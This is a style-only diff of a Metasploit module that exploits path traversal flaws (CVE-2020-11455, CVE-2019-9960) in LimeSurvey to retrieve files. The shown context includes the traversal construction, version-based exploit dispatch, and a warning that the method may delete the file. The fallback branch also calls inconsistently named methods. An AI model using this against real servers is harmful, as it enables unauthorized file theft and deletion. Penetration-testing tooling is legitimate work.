@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def cve_2020_11455(cookie, ip)
     vprint_status('Attempting to retrieve file')
-    print_error 'This method will possibly delete the file retrieved!!!'
+    print_error('This method will possibly delete the file retrieved!!!')
     traversal = '../' * datastore['DEPTH']
     res = send_request_cgi({
       'method' => 'GET',
@@ -180,26 +180,26 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     cookie = login
-    version = determine_version cookie
+    version = determine_version(cookie)
     if version.nil?
       # try them all!!!
       print_status('Unable to determine version, trying all exploits')
-      cve_2020_11455 cookie, ip
-      cve_2019_9960_3_15_9 cookie, ip
-      cve_2019_9960_pre3_15_9 cookie, ip
+      cve_2020_11455(cookie, ip)
+      cve_2019_9960_3_15_9(cookie, ip)
+      cve_2019_9960_pre3_15_9(cookie, ip)
     end
-    vprint_status "Version Detected: #{version.version}"
+    vprint_status("Version Detected: #{version.version}")
     if version.between?(Gem::Version.new('4.0'), Gem::Version.new('4.1.11'))
-      cve_2020_11455 cookie, ip
+      cve_2020_11455(cookie, ip)
     elsif version.between?(Gem::Version.new('2.50.0'), Gem::Version.new('3.15.9'))
-      cve_2019_9960_version_3 cookie, ip
+      cve_2019_9960_version_3(cookie, ip)
     # 2.50 is when LimeSurvey started doing almost daily releases.  This version was
     # picked arbitrarily as I can't seem to find a lower bounds on when this other
     # method may be needed.
     elsif version < Gem::Version.new('2.50.0')
-      cve_2019_9960_pre25 cookie, ip
+      cve_2019_9960_pre25(cookie, ip)
     else
-      print_bad "No exploit for version #{version.version}"
+      print_bad("No exploit for version #{version.version}")
     end
   end
 end
